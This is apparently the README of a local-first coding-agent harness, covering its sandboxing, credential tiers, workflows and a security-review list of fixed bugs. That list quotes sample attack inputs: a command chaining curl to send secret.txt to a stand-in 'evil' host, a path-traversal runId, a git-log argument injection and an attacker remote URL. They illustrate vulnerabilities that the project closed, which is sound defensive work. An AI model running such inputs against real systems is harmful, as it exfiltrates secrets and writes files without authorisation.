# ClutchCode

A model-agnostic, local-first coding-agent runtime and harness.

ClutchCode is the harness layer that sits between a language model and a
codebase: it inspects, edits, runs, tests, repairs, and verifies code on
your machine, adapting to whatever model you point it at — from a frontier
API to a 14B model on your own GPU. It never phones home, and "done" means
the build and tests actually passed, not that the model said so.

See [`PROJECT_SPEC.md`](./PROJECT_SPEC.md) for the full architecture and
design rationale (the authoritative Phase 0 deliverable), and
[`LICENSE_AND_REUSE_ANALYSIS.md`](./LICENSE_AND_REUSE_ANALYSIS.md) for the
licensing/reuse rules that govern this implementation.

## Status

**Phase 1 shipped; Phase 2 in progress.** Per `PROJECT_SPEC.md §21`,
Phase 1 is: one agent, one default workflow, two provider adapters
(OpenAI-compatible + Ollama; Anthropic native shipped early too),
SEARCH/REPLACE edits with fallback, git worktree isolation, deterministic
verification with cheat detection, and a terminal CLI — all done. The
capability probe (§4.9), context budgeter (§4.5), and edit-format selector
(§4.4) — the adaptation layer's "crown jewel" (§4.2) — exist as a
standalone, tested package (`clutchcode models probe`) and are now wired
into the live agent loop: a run picks up a probed model's profile
automatically (falling back to the provider's own defaults per ADR-015
when nothing's been probed yet), the system prompt's edit-format guidance
follows `select_edit_format`, `maxOutputTokens` follows the reserved-output
budget, and conversation history is compacted (turn-safe, never splitting
a tool call from its result) once the effective-context budget is
exceeded. Not yet enforced: dedicated repo-map/open-file-window budgets
(§9, §4.5) — that subsystem doesn't exist before Phase 7, so their share
is folded into the live history budget for now.

`agent resume` is hardened (§6.2, §6.3, §18.2): a run paused on a budget
limit persists its full conversation transcript — redacted (§5.2) before
every write, the same guarantee `toolCallLog` already had — and `agent
resume <runId> --extend-steps N` (also `--extend-wallclock-ms` /
`--extend-tokens` / `--extend-cost-usd`) reconstructs the loop from that
transcript and actually continues it, rather than only re-attaching and
reporting status. `agent run` gained matching `--max-steps` /
`--max-wallclock-ms` / `--max-tokens` / `--cost-ceiling-usd` budget
overrides.

**§5.1's credential storage is done — all three tiers.** `agent providers
set-key <anthropic|openai-compatible>` reads a key from stdin — never an
argument, never shell history — and stores it, with the real precedence
chain (keychain → encrypted file store → env vars) now backing every run,
probe, and CLI command. **Tier 1, OS keychain:** Linux is verified against
a real, running freedesktop Secret Service (`secret-tool`/libsecret): a
full suite spins up a throwaway D-Bus session + `gnome-keyring-daemon` and
proves store/get/clear round-trip and that a keychain-stored credential
genuinely takes precedence over the same-named env var, not just that the
plumbing compiles. macOS (`security` CLI) and Windows (DPAPI via
PowerShell — deliberately not `cmdkey`, which can't read a password back
without a native helper) are written against documented, stable OS
interfaces with the argv/script shape directly asserted in tests, but
**not runtime-verified** — no macOS/Windows host exists in this
environment, same disclosed gap as the Seatbelt sandbox profile. **Tier
2, the encrypted file store** (`~/.config/clutchcode/credentials.age`,
used only on machines with no keychain at all — headless Linux, some
Profile-D servers): AES-256-GCM via Node's built-in `crypto`, keyed by a
locally generated, permission-protected "machine key" file plus an
optional passphrase — a deliberate scoping decision documented in
`credential-file-store.ts`'s header (the `.age` extension follows the
spec's named path, not literal byte-compatibility with the `age` tool,
which would need a from-scratch reimplementation of its wire format to
matter). Unlike Tier 1, this needs no OS binary and so is uniformly
verified everywhere this repo builds: real round-trip tests, a wrong
passphrase or a tampered auth tag failing closed instead of returning
garbage, two different machine keys never seeing each other's values.
Every tier fails closed and silent on any error (locked keyring, no
session bus, missing binary, wrong passphrase — all just "not available,"
never a hard error or a hang), so a broken or absent keychain always
falls through cleanly to the next tier.

**Phase 5's git edge cases (§13.4/§13.5) are done.** Submodule writes now
ask for explicit approval instead of silently landing in the run's own
commits; LFS-tracked writes/edits are flagged (`lfsTracked`) rather than
ignored; `read_file` recognizes LFS pointer stubs and refuses real binary
content instead of returning mojibake; `agent run --scope path/` pins
verification to a monorepo subdir; `agent checkpoints`/`agent rollback`
expose the checkpoint history that already existed at the git layer but
had no CLI surface; `agent pr` pushes a run's branch and opens a PR via
`gh` (falling back to a real GitHub compare URL, or just confirming the
push) — the delivery path alongside `agent approve`, without merging
locally. A real bug also got fixed along the way: `approve --squash`'s
final commit was bypassing the user's pre-commit hooks the same way
internal checkpoints correctly do — §13.4 says hooks should run on the
final approved commit, and now they do. Deliberately not attempted: full
non-git (snapshot-backed) `AgentLoop` execution — `agent run` now fails
with a clear "run git init" error instead of a confusing git error three
calls deep, but a parallel non-git execution path is a distinctly larger
project than this pass's scope.

**Phase 3's OS sandbox Tier 1 (§12.5/§12.6) is done on Linux, written (not
runtime-verified) on macOS.** `shell` now runs under real OS confinement
by default when available: Linux via bubblewrap namespaces (fs bound to
the workspace + standard system dirs read-only, network and pid
namespaces unshared, a synthetic empty `$HOME`), macOS via a generated
Seatbelt (`sandbox-exec`) profile in the same shape. This isn't just
wired — it's proven: a test suite writes a file outside the workspace and
asserts a sandboxed `cat` of it fails, asserts a network fetch inside the
sandbox is unreachable, and asserts the real CLI binary's own `npm test`
run still passes confined. The macOS path is authored against the
documented SBPL grammar and the same shape other sandboxed dev tools use,
but has never run against a real `sandbox-exec` — no macOS host exists in
this environment, so that's flagged rather than claimed. `agent.toml`'s
`policy.sandboxTier = "tier0"` is the documented escape hatch when Tier 1
breaks a legitimate workflow; `agent doctor` reports which backend is
active. **Seccomp hardening is now layered under bwrap** (x86_64 Linux):
a classic-BPF filter denying ~20 syscalls a dev/build/test workflow never
legitimately needs but that are common sandbox-escape/privilege-escalation
primitives (`ptrace`, `mount`, `bpf`, `unshare`, `kexec_load`, kernel
module loading, and others — see `seccomp-linux.ts` for the full list and
each entry's one-line reason), hand-assembled directly in TypeScript
(zero new runtime dependency) and proven end-to-end against the real
kernel: a real bwrap-sandboxed process invokes each denied syscall by
number and gets EPERM, a control run without the filter proves the same
syscall succeeds unfiltered, and ordinary shell usage still works fine
under it. **Landlock is explicitly not attempted** — unlike seccomp's
publicly documented BPF bytecode format, applying it correctly needs
either a native helper or a raw-syscall binding with no vetted library
and no safe way to verify a hand-rolled one here; a wrong Landlock rule
fails by silently granting more access than intended, a worse mistake
category than seccomp's fail-loud one, so this stays a named gap rather
than a guess. **arm64 seccomp is also not supported yet** — different
syscall numbers, no way to verify them without an arm64 host, reported
honestly by `detectSeccompSupport()` rather than guessed. A Windows Tier 1
backend (WSL2 is the spec's own recommended path there) remains open too.

**Phase 4's VS Code extension (§18.1/§18.5) is built.** A new
`@clutchcode/agent-rpc` package gives the runtime a second binding
alongside the in-process one the CLI uses: LSP-style framed JSON-RPC 2.0
over stdio (`Content-Length`-prefixed messages, a `FrameDecoder` that
handles partial/chunked delivery), with `run/status/listRuns/diff/approve/
reject/resume/inspect/checkpoints/rollback/pr` mapped onto real `Agent`
methods and runtime events forwarded as `clutchcode/event` notifications.
`clutchcode serve` runs it over real stdin/stdout. `apps/vscode` is a thin
client of that boundary — per §18.1's "no separate reimplementation of
agent logic," `runTask.ts`/`connection.ts`/`presentation.ts` hold all of
the orchestration (run → stream → diff → approve/reject, plus resume/
rollback/pr) and spawn logic with zero `vscode` import, and are proven
with real round-trip tests: a real `Agent` behind a real `AgentRpcClient`
over `PassThrough` streams, and a separate test that spawns the actual
compiled `clutchcode serve` binary as a child process and drives a run
through it end to end. `extension.ts` — the one file that calls
`vscode.window`/`vscode.commands` — type-checks cleanly against the
official `@types/vscode` but has **not** run inside a real VS Code
extension host; there's no `vscode` runtime in this environment to verify
it against, and the code says so in a header comment rather than claiming
more than was checked (`apps/vscode/README.md` states the same boundary).

**§18.5 polish landed:** a new `@clutchcode/git` function,
`diffFilesAgainstBase`, produces per-file `{path, status, before, after,
binary}` — real before/after file content instead of just unified-diff
text — proven with real git worktrees covering added/modified/deleted/
renamed/binary files, wired through `Agent.diffFiles`/the `diffFiles`
RPC method the same way `diff`/`diffStat` already were. `extension.ts`
uses it to open one **real `vscode.diff` editor per changed file**
(replacing the single unified-text document it opened before), each side
served from a `TextDocumentContentProvider` so the file's own extension
still drives language-aware syntax highlighting on both panes; a binary
file is skipped with a note instead of dumped as mojibake. Every command
(`diff`/`approve`/`reject`/new `resume`/`rollback`/`pr`) now goes through
a real **run-picker** (`pickRun`, backed by the real `listRuns` RPC call,
filtered per command — e.g. only `PAUSED` runs offered for resume) instead
of a free-text run-id input box. `resumeTask`/`rollbackTask`/`prTask` are
new orchestration functions mirroring `runClutchCodeTask`'s existing
split (vscode-free logic, real-`Agent`-backed tests) — `resumeTask`
without an explicit step extension re-pauses immediately, which is
`Agent.resume`'s own documented no-op semantics (§6.3), not a bug here.
Deliberately still out of scope: opening several files' diffs as one
combined multi-file "changes" view (VS Code's newer `vscode.changes`
command isn't universally available across the `^1.85.0` engine range
this extension targets) — one `vscode.diff` tab per file is what ships.

**§10.3's project-memory correction UX is done.** A new `@clutchcode/memory`
package persists toolchain detection as a provenance-timestamped cache
(`{value, derivedAt, source}` per fact — build/test/lint/typecheck/
language/packageManager), keyed by the repo's stable path so it actually
survives across runs — every run used to call `detectToolchain` fresh,
so this is a real behavior change, not just plumbing. Invalidated when
the manifest files it was derived from change content (`package.json`,
`Cargo.toml`, lockfiles, …); `AGENTS.md` overrides still win on every
re-derive. `agent memory list/show/forget/correct` expose it at the CLI —
`correct` is a direct human override (`agent memory correct test "pytest
-q --maxfail=1"`), `forget` clears one fact for re-derivation. The
self-healing half (§10.3 point 3, "verification is the truth oracle"):
a verification failure now classifies `command-not-found` as its own
case (a real bug fixed along the way — a missing `eslint`/`tsc`/etc.
binary used to get misreported as "there's a lint issue" / "there's a
typecheck issue" instead of what it actually is), the repair message
tells the model plainly not to guess at code edits for it, and
`Agent.run`/`Agent.resume` mark the matching cached fact stale so the
*next* run re-derives instead of repeating a proven-wrong command —
proven end-to-end through a real run (a scripted broken command hits the
loop detector's stall check, and the cached fact really is marked stale
afterward, not just at the unit level). Deliberately out of scope: the
"agent proposes an `AGENTS.md` edit, with consent" flow §10.1 also
describes, and the long-term engineering tier (§10 — prior runs/decisions
queryable via a history database) — both real, separate features.

**§8's Workflow Engine is done for the three Phase 1 built-ins.**
`RunState.workflowId` existed since early in the project but was inert —
stored on every run, read by nothing. It's now load-bearing: `agent run
--workflow <default|quickfix|review-only>` selects one of three real,
behaviorally-distinct pipelines. `default` is the unchanged baseline
(plan(opt) → implement → verify → approve → commit). `quickfix` skips the
planning stage unconditionally — even for a task whose description would
otherwise trip the §6.7 heuristic (ambiguity markers, length, low
instruction fidelity), proven by running the identical ambiguous task
description through both workflows and asserting `PLANNING` fires for one
and not the other. `review-only` (inspect → review → report) is read-only
end to end: `write_file`/`edit_file` are filtered out of both the tool
schema sent to the model *and* the dispatch table `AgentLoop` actually
executes against (the same `effectiveTools` map backs both), so a model
that tries to edit anyway gets a genuine `unknown-tool` error, not a
silent no-op — proven with a scripted turn that attempts exactly that
attack and asserts the working tree is untouched afterward. The workflow
then finishes by capturing the model's final reply into
`RunState.summaryCheckpoints` as its report and transitioning straight to
`DONE`, skipping verify/approve/commit entirely (a new, narrowly-scoped
`ACTING → DONE` state-machine edge exists solely for this). An unknown
`--workflow` value is rejected at the `Agent.run` boundary with a clear
error naming the three valid ids, the same "fail loud, three calls up"
style already used for "not a git repo."

**§8.1's user-declarative layer is now built too** — `agent run
--workflow-file <path.json>` runs a real, JSON-Schema-validated custom
workflow (via `ajv`), not just the three built-in ids. The schema mirrors
§8.2's own vocabulary: `{apiVersion: "clutchcode/v1", id, name, stages:
[{id, uses: "plan"|"implement"|"verify"|"approve"|"commit", when?,
params?}]}`. Deliberately *not* a general stage-pipeline interpreter (the
spec's own "no arbitrary control flow" line, honored literally): a
declaration only resolves to a `WorkflowPlan` if it matches one of the two
shapes `AgentLoop` can actually execute — a "full" pipeline (`implement` +
`verify`, `plan` optional with `params.mode: "auto"|"always"`) or a
"readonly" one (`implement` alone with `params.readonly: true`, mirroring
`review-only`) — anything else is rejected with a specific error rather
than silently misinterpreted. This is genuinely more expressive than the
three built-ins, not just a re-skin: `planMode: "always"` (force planning
unconditionally) is only reachable through a custom declaration today —
none of `default`/`quickfix`/`review-only` behave that way. `AgentLoop`
itself was refactored to consume a resolved `WorkflowPlan`
(`{planMode, readonly}`) instead of comparing `state.workflowId` against
hardcoded strings, so it never needs to know whether a run is on a
built-in or a custom workflow — proven by a test that hands `AgentLoop` a
`workflowPlan` directly with no id it recognizes at all. The resolved plan
is persisted on `RunState` itself (`state.workflowPlan`), not re-derived
from the source file on every load — proven by a test that deletes the
declaration file between pausing and resuming a run and shows `resume()`
still honors the original plan correctly. Still deliberately out of
scope: the dedicated `agent workflow` list/select/validate CLI command
(§18.2 marks that command itself Phase 2) — selection is `--workflow
<id>` or `--workflow-file <path>` and nothing more structured yet.

**A code-review pass over this session's own work found and fixed three
real bugs**, not stylistic nits — worth naming because the whole point of
running one was to catch exactly this before it shipped silently:

1. `diffFilesAgainstBase` (§18.5's native diff view) mis-detected a
   *renamed* binary file as text: `git diff --numstat -M` combines a
   rename's two paths into one string (`"old => new"`, or `"dir/{old =>
   new}"` when they share a directory) instead of reporting them
   separately, so matching that combined string against the individually-
   parsed `path`/`oldPath` never worked — the binary flag silently stayed
   `false` and real binary bytes would have been read as UTF-8 and shown
   as mojibake in the VS Code diff view. Fixed by scoping the binary check
   to one explicit pathspec per file (confirmed empirically: git only
   combines rename paths when a diff spans more than the single path it's
   asked about) instead of one bulk query across every changed file.
2. `classifyFailure`'s `command-not-found` fallback pattern included a
   bare `"no such file or directory"` — the exact phrase Node's own
   generic `ENOENT` error uses for *any* missing file (a test fixture, a
   generated asset), not just a missing shell command. A real, fixable
   test failure would have been misclassified as "nothing a code edit can
   fix, escalate" and would have marked a perfectly valid cached
   toolchain command stale. Fixed by only trusting that phrase when the
   surrounding output *isn't* Node's own `ENOENT`-labeled wording — a
   shell's own exec-failure message for a genuinely missing command never
   includes that label, only Node's generic file-not-found error does.
3. `agent memory list/show/forget/correct` had no way to pass `--scope`
   at all, but a scoped run (`agent run --scope path/`, §13.4) caches its
   toolchain memory under `<repoPath>/<scope>`, not the bare repo path —
   so a scoped run's memory was invisible to `agent memory list` and
   `agent memory correct` silently wrote to the wrong cache entirely.
   Fixed by threading `scope` through `@clutchcode/agent-api`'s four
   memory functions and adding `--scope` to the CLI's `memory`
   subcommands, sharing one `resolveMemoryCacheKeyPath` helper with
   `Agent.run` itself so the two can never drift apart again.

All three have tests that fail against the pre-fix code and pass after
(verified by literally reverting the fix and re-running for the first
one) — see `HANDOFF.md`'s "what's done" for the full breakdown.

**A follow-up security-focused review, run over the project's full
history rather than a single diff, found and fixed six real
vulnerabilities and two additional correctness bugs** — again worth
naming in detail, because every fix below was independently reproduced
against a throwaway repo/fixture *before* being trusted, and one
subagent-reported finding was investigated and rejected as a false
positive rather than fixed blind:

1. **§5.2 redaction bypass**: `AgentLoop` scrubbed secrets out of
   `state.messages` before persisting a transcript, but emitted the raw,
   unredacted model reply text on the `model.response` runtime event — a
   separately persisted artifact (`agent-api` writes every event verbatim
   to `<stateDir>/runs/<runId>/events.jsonl`). A model quoting a secret it
   had just read (e.g. summarizing a `.env` file) would leak it into that
   log regardless of the transcript being clean. Fixed by scrubbing
   `response.text` before the event is emitted, the same way `tool.call`
   args already were.
2. **§12.2 approval-memoization bypass**: the shell tool remembers
   non-destructive `ALLOW` decisions per *command class* for a run's
   lifetime, so re-running the same shape of command doesn't re-prompt.
   `commandClassOf` derived that class by taking the first two
   whitespace-separated tokens with no check for shell metacharacters —
   so approving `npm test` once silently pre-approved
   `npm test && curl http://evil/x --data-binary @secret.txt`, because
   both strings start with the same two tokens. Fixed by falling back to
   the full trimmed command string as the class whenever it contains a
   shell metacharacter (`; & | \` < > \n $(`), so a compound command can
   never ride on a simple command's approval.
3. **§13.1 worktree path traversal**: `createRunWorktree` joined the
   caller-supplied `runId` directly into `<stateDir>/wt/<runId>` with no
   validation. A `runId` like `../../../../tmp/pwned-worktree` — reachable
   over the real, untrusted-facing JSON-RPC `run` method — resolves clean
   out of the intended worktree root via ordinary `path.join` `..`
   normalization. Fixed with a strict `runId` allow-list regex
   (`^[A-Za-z0-9_-]+$`) plus a defense-in-depth `path.relative` containment
   check, proven closed at the actual RPC boundary, not just at the
   function's own call site.
4. **Git-log argument injection → arbitrary file write**: the `git` tool's
   `log` op built its CLI args as `` [`-${args.arg ?? "10"}`, ...] `` —
   a caller-controlled `arg` starting with its own `-` (e.g.
   `-output=/tmp/x`) turns the code's own leading dash into a `--output`
   long option, letting a model-controlled argument write an arbitrary
   file via `git log`. Fixed by only ever accepting a bare digit count and
   passing it as `git log -n <count>`, falling back to the default for
   anything else.
5. **Unvalidated git remote parameter**: `remoteUrl`/`pushBranch` accepted
   any string as a "remote name" and passed it straight to `git`, so a
   value like `https://attacker.example/evil.git` or an `ext::` transport
   string would be used as-is instead of a configured remote — a
   push-destination-redirection/exfiltration risk. (A subagent initially
   flagged this as default-on RCE via `ext::`; empirically disproved —
   `git`'s real default for `protocol.ext.allow` is `never`, confirmed by
   reproducing a real `ext::` push attempt in a throwaway repo and seeing
   git itself refuse it. The unvalidated-parameter issue is still real and
   worth closing independent of that corrected severity.) Fixed with a
   strict remote-name allow-list (`^[A-Za-z0-9_.-]+$`), rejecting anything
   that looks like a URL or transport string.
6. **Predictable seccomp filter path**: `ensureSeccompFilterFile` wrote
   the compiled BPF filter to a fixed, predictable path in the shared temp
   directory — a co-resident local user could pre-plant a symlink there
   ahead of the write. Fixed by writing into a freshly `mkdtemp`'d
   (mode-0700-guaranteed) subdirectory with `O_EXCL`, so the write refuses
   to follow any pre-existing symlink or file at the target path.
7. **Edit-cascade ellipsis-elision, leading-`...`  bug** (correctness, not
   security): a SEARCH block that opens with its own `...` line (eliding
   everything before the first real anchor) was rejected unconditionally
   — `firstMatchIdx` was only ever set on segment index `0`, but a leading
   ellipsis makes segment `0` the empty elided segment, which never
   reaches that assignment. Fixed by setting `firstMatchIdx` on the first
   segment that actually matches, not the first segment by index.
8. **Toolchain-memory `correctToolchainFact` stale-hash bug**
   (correctness, violates §10.3's "human edits win" contract): a human
   correction (`agent memory correct`) reused the cached record's
   existing `manifestHash` unchanged. If that hash was already stale
   (e.g. `package.json` had been edited since the last derive), the very
   next `getOrDetectToolchain` call would see the mismatch, conclude the
   whole record was untrustworthy, and silently re-derive from scratch —
   discarding the human's correction with no warning. Fixed by always
   stamping the *current* manifest hash when a correction is written.

All eight have tests that fail against the pre-fix code and pass after;
six of the eight (everything except the remote-name validator and the
seccomp path fix, whose safety follows directly and unambiguously from
their own assertions) were verified the same way as the code-review
pass above — `git stash` the fix, confirm the new test fails, `git
stash pop`, confirm it passes — see `HANDOFF.md`'s "what's done" for the
full breakdown, including the rejected false positive.

## Repository layout

```
packages/
  runtime/        state machine, budgets, loop detection (model-stubbable)
  providers/      Provider interface + adapters (OpenAI-compat, Anthropic, Ollama, Fake)
  tools/          native tool set + truncation
  git/            worktree isolation, checkpoints, diff
  verification/   pipeline, toolchain detect, cheat detection
  memory/         §10.3 project memory — provenance-timestamped toolchain cache, self-healing, correction
  capability/     capability probe, profile persistence, context budgeter, edit-format selector
  agent-api/      the Agent API boundary (in-process)
  agent-rpc/      the Agent API's stdio JSON-RPC binding (LSP-style framing, ACP-shaped)
apps/
  cli/            `clutchcode` CLI (thin client of agent-api; `serve` exposes agent-rpc)
  vscode/         VS Code extension (thin client of agent-rpc over a spawned CLI)
evals/            recorded-transcript replay harness against FakeProvider
docs/             PRIOR_ART.md, adr/
tests/            cross-package integration tests
```

See `PROJECT_SPEC.md §20` for the full target structure and package
boundary rules.

## Development

```sh
pnpm install
pnpm build
pnpm test
```

The runtime is designed to be testable with the model stubbed out
(`PROJECT_SPEC.md §2`): `FakeProvider` drives every runtime/tool/verification
test with zero tokens and no API key or GPU required.

## License

Apache-2.0. Contributions via DCO (sign off your commits: `git commit -s`).
See [`CONTRIBUTING.md`](./CONTRIBUTING.md).
